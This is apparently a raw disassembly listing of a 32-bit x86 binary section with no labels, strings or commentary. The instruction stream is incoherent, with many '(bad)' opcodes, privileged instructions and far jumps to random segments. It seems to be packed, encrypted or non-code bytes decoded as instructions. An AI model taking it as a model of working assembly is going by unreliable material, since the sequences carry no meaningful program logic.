  4136d8:	xor    BYTE PTR [edx-0x3c],al
  4136db:	stc    
  4136dc:	loopne 0x413708
  4136de:	sub    esi,ebp
  4136e0:	les    edx,FWORD PTR [edi-0x7e]
  4136e3:	mov    BYTE PTR [esi-0x335ff8a4],cl
  4136e9:	das    
  4136ea:	dec    eax
  4136eb:	adc    al,0x34
  4136ed:	mov    ebx,0x5272b074
  4136f2:	mov    ?,WORD PTR [edx+0x18]
  4136f5:	inc    edx
  4136f6:	cld    
  4136f7:	fisubr WORD PTR [ecx]
  4136f9:	dec    edx
  4136fa:	xor    DWORD PTR [edx+0x4496ced0],0xffffffa6
  413701:	outs   dx,BYTE PTR ds:[esi]
  413702:	nop
  413703:	iret   
  413704:	mov    edx,0x39245dec
  413709:	mov    WORD PTR [ecx+0x57],ss
  41370c:	inc    esi
  41370d:	or     BYTE PTR [ebx+esi*8-0x34],0x21
  413712:	inc    eax
  413713:	adc    eax,0xa167c2b
  413718:	fwait
  413719:	inc    BYTE PTR [ecx-0x5a]
  41371c:	out    dx,al
  41371d:	adc    dh,BYTE PTR [esi+0x29b4237c]
  413723:	sahf   
  413724:	test   DWORD PTR [esi+edx*1+0xcab6be7],ecx
  41372b:	das    
  41372c:	lea    edx,[edx-0x49ac6056]
  413732:	add    bh,ch
  413734:	jno    0x413791
  413736:	pusha  
  413737:	sbb    BYTE PTR [edi],cl
  413739:	mov    ah,0x3
  41373b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41373c:	and    al,0x46
  41373e:	mov    eax,0x45a7ce4c
  413743:	xchg   edi,eax
  413744:	mov    esp,0x2c6c0e75
  413749:	loopne 0x413778
  41374b:	add    bh,0xc
  41374e:	stc    
  41374f:	sbb    bh,BYTE PTR [ecx-0x1b]
  413752:	loopne 0x413703
  413754:	fstp   DWORD PTR [edx+0x10]
  413757:	and    al,0xa7
  413759:	fmul   st(7),st
  41375b:	mov    ss,ebx
  41375d:	dec    ebp
  41375e:	cli    
  41375f:	(bad)  ds:0xc24454af
  413765:	iret   
  413766:	sahf   
  413767:	fdiv   QWORD PTR [edi]
  413769:	rcl    DWORD PTR [ebx+0xa],1
  41376c:	dec    ecx
  41376d:	adc    eax,DWORD PTR [edi]
  41376f:	xchg   dl,al
  413771:	aam    0x4
  413773:	mov    bl,0x4b
  413775:	cmc    
  413776:	data16 (bad) 
  413778:	xchg   esi,eax
  413779:	xchg   BYTE PTR [edx+0x30],bl
  41377c:	mov    eax,0xf45d812d
  413781:	dec    edi
  413782:	or     eax,0x760d541
  413787:	mov    ebx,0x9882bac2
  41378c:	xor    BYTE PTR [edx],al
  41378e:	push   ebx
  41378f:	leave  
  413790:	test   al,0x91
  413792:	ss mov dl,0x5b
  413795:	jg     0x4137ea
  413797:	jb     0x41378e
  413799:	xor    cl,BYTE PTR [edx-0x1c]
  41379c:	xor    dh,BYTE PTR [ebp-0x1ce8bbda]
  4137a2:	out    dx,al
  4137a3:	inc    eax
  4137a4:	jne    0x4137ae
  4137a6:	pushf  
  4137a7:	jnp    0x413806
  4137a9:	inc    eax
  4137aa:	mov    BYTE PTR [edx-0x6c],0xaa
  4137ae:	ja     0x4137f6
  4137b0:	ds popa 
  4137b2:	mov    cl,0x26
  4137b4:	cli    
  4137b5:	sbb    dl,dh
  4137b7:	add    dh,BYTE PTR [eax+0x299b2fce]
  4137bd:	xchg   ebx,eax
  4137be:	mov    eax,ds:0xd3b753b4
  4137c3:	rcl    BYTE PTR [edx-0xfe4d1d3],0x89
  4137ca:	sbb    eax,0x5a2edee6
  4137cf:	cmp    BYTE PTR [ebx-0x16e53d39],dl
  4137d5:	ja     0x413811
  4137d7:	ret    0x3684
  4137da:	mov    BYTE PTR [ebx+0x4e26cab7],bh
  4137e0:	inc    DWORD PTR [esi]
  4137e2:	cli    
  4137e3:	fs inc edi
  4137e5:	(bad)  
  4137e6:	rol    DWORD PTR [ebx-0x5617bef8],0x20
  4137ed:	fsub   st,st(1)
  4137ef:	inc    ecx
  4137f0:	loope  0x413838
  4137f2:	popf   
  4137f3:	inc    ebx
  4137f4:	xor    DWORD PTR [ecx],eax
  4137f6:	cmp    BYTE PTR [eax],ah
  4137f8:	xchg   ebp,eax
  4137f9:	xor    al,0xb4
  4137fb:	nop
  4137fc:	icebp  
  4137fd:	adc    eax,0x1bde44f3
  413802:	lea    ecx,[ecx-0x7c]
  413805:	jl     0x41385a
  413807:	das    
  413808:	add    BYTE PTR [ecx],0x9b
  41380b:	sti    
  41380c:	xor    bh,BYTE PTR [ecx]
  41380e:	repz add al,0x75
  413811:	icebp  
  413812:	pop    ss
  413813:	fsub   QWORD PTR [esp+ebx*4-0x331d1b18]
  41381a:	dec    ebp
  41381b:	xlat   BYTE PTR ds:[ebx]
  41381c:	push   ecx
  41381d:	jb     0x41384a
  41381f:	ror    DWORD PTR [edi],1
  413821:	lods   eax,DWORD PTR ds:[esi]
  413822:	outs   dx,DWORD PTR ds:[esi]
  413823:	inc    ecx
  413824:	jle    0x413825
  413826:	dec    eax
  413827:	xchg   edi,eax
  413828:	xchg   ebx,eax
  413829:	lea    ebx,[ebx+0x68]
  41382c:	adc    al,0x35
  41382e:	lock push cs
  413830:	push   0xffffffb9
  413832:	push   esp
  413833:	mov    ds:0x51634ea5,al
  413838:	xchg   BYTE PTR [edi],al
  41383a:	les    ecx,FWORD PTR [ebx]
  41383c:	xchg   esi,eax
  41383d:	retf   
  41383e:	mov    eax,ds:0xc01faae2
  413843:	xlat   BYTE PTR ds:[ebx]
  413844:	add    ebp,DWORD PTR [esi+eax*8]
  413847:	add    al,BYTE PTR [ecx]
  413849:	pop    es
  41384a:	adc    eax,0xa9ef6fde
  41384f:	push   edx
  413850:	retf   
  413851:	(bad)  
  413852:	cmc    
  413853:	fsubrp st(7),st
  413855:	pusha  
  413856:	sub    al,0x77
  413858:	mov    ecx,0xb24e44f5
  41385d:	rcr    edx,cl
  41385f:	js     0x4138d0
  413861:	xor    DWORD PTR [edi+0x3598f026],edx
  413867:	pop    ss
  413868:	loopne 0x4138b0
  41386a:	push   edi
  41386b:	and    edx,DWORD PTR [ecx]
  41386d:	dec    edi
  41386e:	mov    al,ds:0x9b11cceb
  413873:	adc    ebx,esp
  413875:	and    ebx,DWORD PTR [edi-0x4564bca8]
  41387b:	imul   edi,DWORD PTR [ebx+edx*1],0xfffffffb
  41387f:	lods   al,BYTE PTR ds:[esi]
  413880:	(bad)  
  413881:	out    0x8f,eax
  413883:	add    DWORD PTR [esi+0x7e],edi
  413886:	mov    dh,0xd5
  413888:	mov    ds:0x173b82a8,eax
  41388d:	inc    ebp
  41388e:	xchg   ebx,eax
  41388f:	jmp    0xfa7c5b3f
  413894:	push   ds
  413895:	lds    ebx,FWORD PTR [edx-0x52]
  413898:	call   0x7c70:0xac0be7cd
  41389f:	jmp    0x413916
  4138a1:	retf   
  4138a2:	aas    
  4138a3:	mov    esp,0x44f231eb
  4138a8:	rcr    DWORD PTR [ebx+ebp*2+0x6d],0x5b
  4138ad:	in     al,dx
  4138ae:	popf   
  4138af:	ins    DWORD PTR es:[edi],dx
  4138b0:	retf   0xb0e8
  4138b3:	or     al,0xce
  4138b5:	loope  0x4138be
  4138b7:	adc    BYTE PTR [eax],0x7a
  4138ba:	out    0xae,eax
  4138bc:	inc    edi
  4138bd:	push   cs
  4138be:	lods   al,BYTE PTR ds:[esi]
  4138bf:	fisubr WORD PTR [edi]
  4138c1:	fidivr WORD PTR [edx+0x7f0c59aa]
  4138c7:	mov    ds:0x4c9823c0,eax
  4138cc:	jp     0x4138c1
  4138ce:	add    bh,BYTE PTR [edi]
  4138d0:	jns    0x4138f4
  4138d2:	mov    ebp,0x515922ed
  4138d7:	push   ds
  4138d8:	popa   
  4138d9:	sbb    dh,ah
  4138db:	fwait
  4138dc:	arpl   WORD PTR [edi],sp
  4138de:	les    ecx,FWORD PTR [ebx-0x78]
  4138e1:	ja     0x41391b
  4138e3:	cmp    eax,0xc0fec653
  4138e8:	or     bl,dl
  4138ea:	mov    WORD PTR [esi-0x77ca6ce1],gs
  4138f0:	fild   QWORD PTR [edi-0x602f4a1f]
  4138f6:	es pushf 
  4138f8:	cwde   
  4138f9:	rcr    ebx,cl
  4138fb:	data16 fimul WORD PTR ds:0x397f94bd
  413902:	xchg   ebx,eax
  413903:	sub    esp,edx
  413905:	mov    edx,0xdd4799a8
  41390a:	das    
  41390b:	dec    BYTE PTR [eax+0x2019e883]
  413911:	stos   BYTE PTR es:[edi],al
  413912:	inc    ebx
  413913:	inc    edi
  413914:	pusha  
  413915:	imul   esi,DWORD PTR ds:0xfa0356be,0x6c8c387a
  41391f:	or     ebx,ebx
  413921:	mov    BYTE PTR [esi-0x64f21474],dh
  413927:	fimul  WORD PTR [ecx]
  413929:	and    BYTE PTR [esi+0x30],0x97
  41392d:	stos   BYTE PTR es:[edi],al
  41392e:	mov    eax,0x985d0119
  413933:	jmp    0x41394d
  413935:	addr16 jl 0x413910
  413938:	jnp    0x4138e3
  41393a:	fs push 0x278c33b4
  413940:	popa   
  413941:	dec    ebx
  413942:	imul   ebx,DWORD PTR [edi-0x40a58a3c],0xffffff80
  413949:	test   BYTE PTR [ecx+0x195b62ca],cl
  41394f:	data16 sbb BYTE PTR [eax-0x6929816c],cl
  413956:	lods   eax,DWORD PTR ds:[esi]
  413957:	sbb    BYTE PTR [edi-0x8],dh
  41395a:	cmp    ebp,DWORD PTR [edx]
  41395c:	sbb    ah,BYTE PTR [ebx+0x14ab6f06]
  413962:	push   ss
  413963:	jmp    0xb366:0xaa0a736a
  41396a:	pushf  
  41396b:	or     DWORD PTR [edx],edx
  41396d:	jg     0x413923
  41396f:	fstp   TBYTE PTR [esi]
  413971:	sti    
  413972:	jno    0x413937
  413974:	(bad)  
  413975:	test   DWORD PTR [ebx-0x46],0x63c55148
  41397c:	ja     0x413997
  41397e:	mov    edx,0x9d48219e
  413983:	test   al,0x3
  413985:	pop    esp
  413986:	push   ecx
  413987:	imul   esp,DWORD PTR [esi+edx*8],0xdb6c2dff
  41398e:	jno    0x413a0f
  413990:	jp     0x413968
  413992:	jmp    0x5450:0x9c7d98f7
  413999:	retf   0xa477
  41399c:	hlt    
  41399d:	jae    0x413972
  41399f:	or     BYTE PTR [edi],bl
  4139a1:	inc    edx
  4139a2:	xor    al,0x7
  4139a4:	imul   ebx,DWORD PTR [edx],0xf11754ed
  4139aa:	push   ebx
  4139ab:	pop    edi
  4139ac:	jge    0x413a08
  4139ae:	xchg   ebp,eax
  4139af:	repz js 0x413a19
  4139b2:	or     eax,0xecc7eeb2
  4139b7:	mov    BYTE PTR ds:0x56614fb6,dl
  4139bd:	or     ebp,DWORD PTR [esi]
  4139bf:	jne    0x4139c2
  4139c1:	push   esp
  4139c2:	and    BYTE PTR [ebx-0x4e],bh
  4139c5:	into   
  4139c6:	push   ecx
  4139c7:	sub    bh,BYTE PTR [esi+0x4c27c6e]
  4139cd:	jecxz  0x4139fc
  4139cf:	sahf   
  4139d0:	pop    ss
  4139d1:	pusha  
  4139d2:	inc    edx
  4139d3:	test   eax,0x47e399fa
  4139d8:	ret    
  4139d9:	call   0xb9b7:0x83ca86f7
  4139e0:	aaa    
  4139e1:	stos   BYTE PTR es:[edi],al
  4139e2:	jge    0x413a61
  4139e4:	ret    0xd5cd
  4139e7:	sbb    al,0x52
  4139e9:	sbb    DWORD PTR [ebx-0x748b90db],edx
  4139ef:	stos   BYTE PTR es:[edi],al
  4139f0:	(bad)  
  4139f1:	retf   0x493b
  4139f4:	test   al,dh
  4139f6:	js     0x413a50
  4139f8:	mov    cs,WORD PTR [edi-0x728da157]
  4139fe:	pop    eax
  4139ff:	cmp    DWORD PTR [esi],ebx
  413a01:	dec    edx
  413a02:	setno  ch
  413a05:	adc    eax,0x6bef8ecb
  413a0a:	fsub   DWORD PTR [ecx-0x7d6952f9]
  413a10:	pop    ds
  413a11:	fstp   TBYTE PTR ds:0xeab422c8
  413a17:	inc    ecx
  413a18:	ins    DWORD PTR es:[edi],dx
  413a19:	jge    0x4139e0
  413a1b:	aaa    
  413a1c:	fldenv [eax+0x74]
  413a1f:	xor    bh,0x96
  413a22:	jb     0x413a2d
  413a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a25:	or     eax,0xab0ae612
  413a2a:	jle    0x413a08
  413a2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a2d:	adc    bl,BYTE PTR [ebx+eax*2+0x7d]
  413a31:	out    0x33,al
  413a33:	(bad)  
  413a34:	int3   
  413a35:	popa   
  413a36:	les    eax,FWORD PTR [edi-0x684428b7]
  413a3c:	fcomp  DWORD PTR [eax]
  413a3e:	sbb    al,0xa4
  413a40:	push   edx
  413a41:	mov    ds:0x3d60132,eax
  413a46:	jmp    0x8ba25c04
  413a4b:	fst    QWORD PTR [edx+0x1f]
  413a4e:	std    
  413a4f:	inc    edi
  413a50:	neg    edx
  413a52:	and    al,BYTE PTR [esi+edx*4]
  413a55:	rol    DWORD PTR [ebx+0x26],0x8e
  413a59:	cmp    eax,0x95ea69eb
  413a5e:	sti    
  413a5f:	in     eax,0x26
  413a61:	retf   
  413a62:	cmp    DWORD PTR [ecx],ecx
  413a64:	dec    ebp
  413a65:	jg     0x413a21
  413a67:	jnp    0x413ae2
  413a69:	cdq    
  413a6a:	mov    dl,0x4d
  413a6c:	shl    ch,0xb
  413a6f:	xor    eax,0x38f57f9e
  413a74:	les    edi,FWORD PTR [edi+ecx*4+0x1c993066]
  413a7b:	push   eax
  413a7c:	inc    ebx
  413a7d:	add    eax,0xa8c55b5
  413a82:	push   edi
  413a83:	imul   ebx,DWORD PTR [edi+0x31052e92],0xffffff8c
  413a8a:	lahf   
  413a8b:	cwde   
  413a8c:	inc    esp
  413a8d:	popf   
  413a8e:	int3   
  413a8f:	mov    cl,0xf2
  413a91:	mov    eax,esp
  413a93:	hlt    
  413a94:	sbb    al,0xf1
  413a96:	ret    
  413a97:	push   cs
  413a98:	pop    ss
  413a99:	(bad)  
  413a9b:	cmc    
  413a9c:	mov    edx,0xd04aa48d
  413aa1:	fidivr DWORD PTR ds:0x5d045cbe
  413aa7:	clc    
  413aa8:	outs   dx,DWORD PTR ds:[esi]
  413aa9:	jg     0x413b24
  413aab:	xchg   ebp,eax
  413aac:	ret    
  413aad:	sub    BYTE PTR [esi],dl
  413aaf:	push   ss
  413ab0:	sub    al,BYTE PTR ds:0x38854a83
  413ab6:	adc    al,0x85
  413ab8:	or     DWORD PTR [ebp-0x1010ee4f],esi
  413abe:	sbb    esi,DWORD PTR [edx-0x6796c819]
  413ac4:	inc    eax
  413ac5:	jge    0x413b31
  413ac7:	(bad)  
  413ac8:	xor    BYTE PTR [edi+0x6a9051ec],bh
  413ace:	cmp    al,BYTE PTR ds:0xfacc0052
  413ad4:	mov    ah,0x54
  413ad6:	sar    BYTE PTR [esi+0x525fe629],1
  413adc:	out    0x11,eax
  413ade:	or     eax,0x5d56a36e
  413ae3:	pop    ds
  413ae4:	xor    ebp,DWORD PTR [edx]
  413ae6:	jbe    0x413b17
  413ae8:	adc    al,0x9a
  413aea:	aas    
  413aeb:	and    ch,BYTE PTR [bx]
  413aee:	pusha  
  413aef:	push   ss
  413af0:	hlt    
  413af1:	test   DWORD PTR [ecx+0x347ebd80],eax
  413af7:	push   eax
  413af8:	xor    ecx,ebp
  413afa:	not    ebx
  413afc:	jb     0x413b3f
  413afe:	leave  
  413aff:	xchg   esp,eax
  413b00:	and    DWORD PTR [esi-0x5d],edx
  413b03:	repz adc eax,0xdadc30d2
  413b09:	frstor cs:[ecx-0x4e]
  413b0d:	in     al,dx
  413b0e:	mov    dh,al
  413b10:	mov    ecx,0xa52b6581
  413b15:	jns    0x413b53
  413b17:	push   eax
  413b18:	jmp    0x413b49
  413b1a:	daa    
  413b1b:	call   0x145287e0
  413b20:	or     al,0xee
  413b22:	pusha  
  413b23:	cmp    bl,BYTE PTR [eax-0x66ab4f0c]
  413b29:	les    edi,FWORD PTR [ebx-0x4230f7c7]
  413b2f:	push   0x868c6971
  413b34:	adc    esi,eax
  413b36:	cmc    
  413b37:	out    0xc4,al
  413b39:	mov    ebp,0x2fa5b545
  413b3e:	arpl   WORD PTR [ebp+0x4c],si
  413b41:	dec    edx
  413b42:	mov    ecx,0x5ef44723
  413b47:	adc    eax,0x1d7a3320
  413b4c:	add    al,0x8b
  413b4e:	hlt    
  413b4f:	gs jae 0x413af8
  413b52:	stc    
  413b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b54:	adc    BYTE PTR [ecx],bh
  413b56:	out    0xed,al
  413b58:	mov    dh,0x75
  413b5a:	test   al,0x5e
  413b5c:	iret   
  413b5d:	inc    ebx
  413b5e:	rsm    
  413b60:	push   edx
  413b61:	ror    BYTE PTR [ebx+edx*2+0x23],1
  413b65:	and    BYTE PTR [eax+0x31],bl
  413b68:	sahf   
  413b69:	fistp  DWORD PTR [eax+0xd]
  413b6c:	xchg   edx,eax
  413b6d:	adc    BYTE PTR [ebx],dh
  413b6f:	xor    al,0xb4
  413b71:	xchg   BYTE PTR [ecx],dl
  413b73:	mov    esp,0x9d756715
  413b78:	mov    esi,0x8fa3e705
  413b7d:	jg     0x413b9f
  413b7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b80:	aam    0x93
  413b82:	mov    edi,DWORD PTR [edi+0x6f76723d]
  413b88:	dec    ebx
  413b89:	pop    ecx
  413b8a:	jg     0xbcd592
  413b90:	jmp    FWORD PTR [eax]
  413b92:	sti    
  413b93:	pop    ds
  413b94:	aam    0xbe
  413b96:	fsubrp st(0),st
  413b98:	adc    dh,bl
  413b9a:	adc    eax,0xc333c850
  413b9f:	out    0x79,eax
  413ba1:	mov    bh,0x37
  413ba3:	jg     0x413bf5
  413ba5:	xchg   ebx,eax
  413ba6:	in     eax,0x51
  413ba8:	ror    BYTE PTR [ebx+ebp*8-0x1a95a699],1
  413baf:	popf   
  413bb0:	sbb    DWORD PTR [edi-0x59],edx
  413bb3:	jl     0x413bc2
  413bb5:	pop    ecx
  413bb6:	aad    0xa8
  413bb8:	xchg   BYTE PTR [esi+0x5a02052a],bh
  413bbe:	push   ecx
  413bbf:	jo     0x413b53
  413bc1:	xchg   ebx,eax
  413bc2:	ss inc eax
  413bc4:	xchg   esi,eax
  413bc5:	xor    al,0x97
  413bc7:	inc    esp
  413bc8:	retf   0xe433
  413bcb:	xchg   edx,eax
  413bcc:	aas    
  413bcd:	pop    ss
  413bce:	adc    eax,esp
  413bd0:	(bad)  
  413bd2:	mov    bh,0xf1
  413bd4:	dec    ebp
  413bd5:	pop    eax
  413bd6:	arpl   WORD PTR [ecx],si
  413bd8:	repnz cs sub al,0x99
  413bdc:	inc    ecx
  413bdd:	sub    ecx,edx
  413bdf:	mov    ecx,0x27cb18
  413be4:	dec    ebp
  413be5:	ret    0x7865
  413be8:	xchg   DWORD PTR [ebx-0x70f42880],esp
  413bee:	pop    esi
  413bef:	fdiv   DWORD PTR [eax+0x78ca23ea]
  413bf5:	jmp    0x413c66
  413bf7:	scas   eax,DWORD PTR es:[edi]
  413bf8:	cwde   
  413bf9:	push   DWORD PTR [ebx]
  413bfb:	push   ds
  413bfc:	(bad)
  413bff:	or     DWORD PTR [edx+edi*2-0x19],edi
  413c03:	imul   esp,DWORD PTR [ebp-0x61],0x6758336
  413c0a:	les    ebp,FWORD PTR [ebx+0x700a0ace]
  413c10:	loopne 0x413bb2
  413c12:	mov    ss,WORD PTR ds:0xde4f2f5f
  413c18:	(bad)  
  413c1a:	mov    edx,0xdfaa6a10
  413c1f:	push   esi
  413c20:	push   0xf7ca4403
  413c25:	cdq    
  413c26:	mov    ds:0x8dcbc0d6,al
  413c2b:	retf   0x4c4c
  413c2e:	call   0xe55c:0xb4d4f944
  413c35:	daa    
  413c36:	test   eax,0xb91f513c
  413c3b:	ret    0x9d36
  413c3e:	push   eax
  413c3f:	add    dh,BYTE PTR [esi]
  413c41:	outs   dx,BYTE PTR ds:[esi]
  413c42:	pop    ss
  413c43:	mov    ah,0x60
  413c45:	fs mov ebp,0x578519d2
  413c4b:	std    
  413c4c:	(bad)  
  413c4d:	lds    eax,FWORD PTR [eax-0x11b8eb99]
  413c53:	out    0x97,eax
  413c55:	fst    st(7)
  413c57:	ret    0x29b0
  413c5a:	in     al,0xd8
  413c5c:	sub    DWORD PTR [edx-0x6f],esp
  413c5f:	hlt    
  413c60:	cmp    eax,0xecf16cda
  413c65:	sub    BYTE PTR [ebp+0x47ce564e],dh
  413c6b:	mov    ch,0xff
  413c6d:	or     BYTE PTR [edi+0x44],dh
  413c70:	add    eax,0x2c3a97a
  413c75:	mov    eax,ds:0xad57e317
  413c7a:	jo     0x413cec
  413c7c:	mov    ch,0x25
  413c7e:	xchg   esp,eax
  413c7f:	mov    BYTE PTR [eax-0x6ba2b70c],0xd6
  413c86:	jb     0x413c28
  413c88:	fwait
  413c89:	bound  esp,QWORD PTR [ebx+eax*4]
  413c8c:	mov    bl,0x10
  413c8e:	xchg   ebx,eax
  413c8f:	inc    edi
  413c90:	sbb    eax,0x7a5d53e4
  413c95:	fimul  DWORD PTR [ecx+0x4b3bf400]
  413c9b:	add    DWORD PTR [eax+0x3aa80993],0x1e7f11c
  413ca5:	mov    ch,0x24
  413ca7:	mov    al,ds:0x52135320
  413cac:	or     eax,0xe54612d
  413cb1:	push   eax
  413cb2:	push   0xf1e193ae
  413cb7:	jmp    0xc4eb:0x99e3e541
  413cbe:	lods   al,BYTE PTR ds:[esi]
  413cbf:	pop    edi
  413cc0:	repz mov esi,0x20e524bb
  413cc6:	and    esp,edi
  413cc8:	mov    fs,ebx
  413cca:	and    ebp,esi
  413ccc:	sahf   
  413ccd:	pop    ebp
  413cce:	push   0x4eb88061
  413cd3:	jo     0x413c87
  413cd5:	jb     0x413c85
  413cd7:	sbb    eax,0x8401c763
  413cdc:	imul   edi,DWORD PTR [eax+esi*1+0x7cfe59d7],0x10
  413ce4:	jl     0x413ccc
  413ce6:	pop    ecx
  413ce7:	push   eax
  413ce8:	clc    
  413ce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cea:	push   edi
  413ceb:	je     0x413c8c
  413ced:	sub    DWORD PTR [ecx],0x71
  413cf0:	dec    ebp
  413cf1:	out    dx,al
  413cf2:	dec    eax
  413cf4:	mov    bh,0x9d
  413cf6:	adc    DWORD PTR [esi],ecx
  413cf8:	mov    DWORD PTR [ebx],esp
  413cfa:	nop
  413cfb:	pop    ss
  413cfc:	arpl   WORD PTR [ebp+eiz*1-0x603798d3],cx
  413d03:	sbb    al,BYTE PTR [esi+ebx*4+0x13a90f0c]
  413d0a:	push   ebx
  413d0b:	jecxz  0x413d34
  413d0d:	adc    BYTE PTR [eax],0x86
  413d10:	fistp  QWORD PTR ss:[ebp+0x654ed8a2]
  413d17:	mov    eax,ds:0x51671836
  413d1c:	mov    WORD PTR ds:0xe11e1a47,?
  413d22:	sbb    al,0x6a
  413d24:	sbb    DWORD PTR [edx-0x1ee7ebe6],ebx
  413d2a:	int3   
  413d2b:	clc    
  413d2c:	daa    
  413d2d:	add    eax,0xd9232e7c
  413d32:	push   es
  413d33:	pop    eax
  413d34:	dec    edi
  413d35:	sbb    al,BYTE PTR [ecx-0x6b146c43]
  413d3b:	mov    BYTE PTR [ebx+0x69],ch
  413d3e:	sbb    esp,DWORD PTR [ebx+esi*2-0x35fb1bca]
  413d45:	push   DWORD PTR [edx]
  413d47:	mov    ebx,DWORD PTR [esi+ebx*8+0xd]
  413d4b:	push   ds
  413d4c:	pusha  
  413d4d:	sub    eax,0x2b14bbbf
  413d52:	jl     0x413d9e
  413d54:	loopne 0x413d81
  413d56:	add    esp,ebp
  413d58:	ficom  DWORD PTR [ecx-0xbb5092b]
  413d5e:	ret    0xd944
  413d61:	push   ss
  413d62:	mov    ebp,0xf13d8374
  413d67:	imul   esi,DWORD PTR [edi],0x11
  413d6a:	pop    eax
  413d6b:	rcr    DWORD PTR [edi-0x737490b0],1
  413d71:	in     al,dx
  413d72:	iret   
  413d73:	bound  edi,QWORD PTR [edi+0x67]
  413d76:	out    dx,eax
  413d77:	xor    dl,ch
  413d79:	jp     0x413dce
  413d7b:	jbe    0x413df7
  413d7d:	sti    
  413d7e:	mov    WORD PTR ds:0xc3cd5764,ds
  413d84:	(bad)
  413d88:	daa    
  413d89:	xchg   ecx,eax
  413d8a:	xor    ebp,DWORD PTR [edx+0x47aec7bb]
  413d90:	pop    edi
  413d91:	xchg   esp,eax
  413d92:	fidivr DWORD PTR [eax-0x70fb73d9]
  413d98:	mov    al,BYTE PTR [ebp-0x2c]
  413d9b:	push   ebp
  413d9c:	mov    ds:0x4e011676,al
  413da1:	outs   dx,BYTE PTR ds:[esi]
  413da2:	into   
  413da3:	loope  0x413d85
  413da5:	or     bl,0x24
  413da8:	mov    al,0x89
  413daa:	mov    WORD PTR [esp+edi*2-0x2c],gs
  413dae:	xchg   DWORD PTR [eax-0x51],edx
  413db1:	inc    esp
  413db2:	sub    dl,BYTE PTR [esi-0x72]
  413db5:	cld    
  413db6:	les    eax,FWORD PTR [esi-0x53]
  413db9:	mov    esi,0x5f06dc3f
  413dbe:	cmc    
  413dbf:	fisttp WORD PTR [ebp-0x2c]
  413dc2:	push   esi
  413dc3:	sbb    ch,BYTE PTR [eax]
  413dc5:	aas    
  413dc6:	pop    es
  413dc7:	add    eax,0xf45d4e18
  413dcc:	out    0xbd,eax
  413dce:	enter  0x4db8,0xe9
  413dd2:	shl    DWORD PTR [ebp-0x80],cl
  413dd5:	cmp    eax,0x7ef6893
  413ddb:	cld    
  413ddc:	or     ch,BYTE PTR [edx+ecx*8+0x4ad7c516]
  413de3:	dec    ebp
  413de4:	mov    esp,0xadeb94d7
  413de9:	push   edi
  413dea:	push   ds
  413deb:	cmp    esi,ebp
  413ded:	adc    ebp,DWORD PTR [edx]
  413def:	jmp    0x413e21
  413df1:	call   FWORD PTR [esi+0x2ef7447c]
  413df7:	and    al,0xf9
  413df9:	pop    eax
  413dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dfb:	clc    
  413dfc:	push   ecx
  413dfd:	nop
  413dfe:	sbb    ch,cl
  413e00:	push   eax
  413e01:	adc    eax,0x7d4514e0
  413e06:	and    al,0x20
  413e08:	add    al,0x17
  413e0a:	lds    ecx,FWORD PTR [edx+0x44856375]
  413e10:	and    ebp,esi
  413e12:	imul   eax,DWORD PTR [esi-0x4c16d544],0xcc7bc2c
  413e1c:	add    esi,edx
  413e1e:	fdivr  QWORD PTR [edx-0x7a]
  413e21:	icebp  
  413e22:	in     al,0xd8
  413e24:	test   al,0x23
  413e26:	or     al,0x3
  413e28:	push   0xffffffd6
  413e2a:	retf   0x1222
  413e2d:	pop    edx
  413e2e:	add    al,0x46
  413e30:	add    ch,BYTE PTR [ecx]
  413e32:	jg     0x413e10
  413e34:	or     al,0x7c
  413e36:	sub    esp,DWORD PTR [ecx]
  413e38:	dec    ebp
  413e39:	sub    cl,BYTE PTR [edx-0xf]
  413e3c:	(bad)  
  413e3d:	push   ecx
  413e3e:	fcom   st(6)
  413e40:	int3   
  413e41:	aad    0x1f
  413e43:	bound  esp,QWORD PTR [ecx+0x76]
  413e46:	rcl    DWORD PTR [ecx+0x2b],0xbc
  413e4a:	xchg   edi,eax
  413e4b:	sub    BYTE PTR [ecx+0x65],bh
  413e4e:	mov    esi,0x34331c0f
  413e53:	lods   al,BYTE PTR ds:[esi]
  413e54:	pop    ebx
  413e55:	jl     0x413e9a
  413e57:	stc    
  413e58:	cli    
  413e59:	ret    
  413e5a:	push   esi
  413e5b:	nop
  413e5c:	and    al,BYTE PTR ds:[edi]
  413e5f:	mov    edx,0x8b5c269a
  413e64:	es pusha 
  413e66:	data16 cli 
  413e68:	rcl    BYTE PTR [esi*2-0x4f0a8e1b],cl
  413e6f:	mul    BYTE PTR [edx+0x64fa2505]
  413e75:	jns    0x413e48
  413e77:	dec    esi
  413e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e79:	jp     0x413e4a
  413e7b:	xchg   ebp,eax
  413e7c:	xchg   edi,eax
  413e7d:	shl    DWORD PTR [ecx+0x45d7f1af],cl
  413e83:	or     BYTE PTR [eax],dl
  413e85:	xor    edi,ebx
  413e87:	daa    
  413e88:	aaa    
  413e89:	sub    al,0xb7
  413e8b:	std    
  413e8c:	loop   0x413eff
  413e8e:	pop    ebx
  413e8f:	loop   0x413f05
  413e91:	jge    0x413f06
  413e93:	dec    esi
  413e94:	mov    bh,0xfa
  413e96:	in     al,0xc4
  413e98:	or     eax,0x561b5324
  413e9d:	add    ah,BYTE PTR [esi+0x5847f82e]
  413ea3:	(bad)  
  413ea4:	bound  edx,QWORD PTR [ebp-0x69e85192]
  413eaa:	sub    al,0x8e
  413eac:	inc    ecx
  413ead:	mov    esi,0x49f6ba5c
  413eb2:	xchg   ch,cl
  413eb4:	pop    edi
  413eb5:	int    0x2e
  413eb7:	jb     0x413f19
  413eb9:	inc    esi
  413eba:	push   esp
  413ebb:	mov    ebx,0x407f20
  413ec0:	pop    esi
  413ec1:	or     al,0xd5
  413ec3:	mov    WORD PTR [edi],es
  413ec5:	inc    ebx
  413ec6:	aaa    
  413ec7:	xchg   edx,eax
  413ec8:	jo     0x413f38
  413eca:	test   BYTE PTR [esi-0x1c],ch
  413ecd:	inc    esi
  413ece:	fstp   DWORD PTR [esi]
  413ed0:	dec    ebp
  413ed1:	clc    
  413ed2:	fld    QWORD PTR [eax-0x32]
  413ed5:	dec    ebx
  413ed6:	adc    eax,0x57d7fe0f
  413edb:	mov    WORD PTR [ebx-0x7a7354b2],es
  413ee1:	ret    
